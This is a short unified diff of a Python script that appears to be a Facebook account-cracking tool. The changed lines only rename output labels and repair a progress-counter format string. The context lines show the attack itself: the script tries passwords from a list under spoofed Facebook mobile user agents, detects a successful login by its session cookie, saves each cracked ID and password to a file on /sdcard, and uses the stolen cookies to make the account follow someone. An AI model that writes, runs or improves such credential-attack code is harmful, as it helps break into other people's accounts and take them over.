@@ -369,10 +369,10 @@ def free(idf,pwv):
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋-𝐃𝐄𝐕𝐈𝐋] {idf} * {pw}')
+				print(f'\r\x1b[1;92m [MX] {idf} * {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋-𝐃𝐄𝐕𝐈𝐋','a').write('%s\n' % wrt)
+				open('/sdcard/MX','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
  
@@ -865,7 +865,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [+]%s> /[MX] %s  [OK] %s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [+]%s> /[MX] %s/%s | [OK] %s | [CP] %s  "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -1295,7 +1295,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 	])
 		sys.stdout.write(
-			"\r [+]>%s/[MX] %s  [OK] %s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [+]>%s/[MX] %s/%s | [OK] %s | [CP] %s  "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
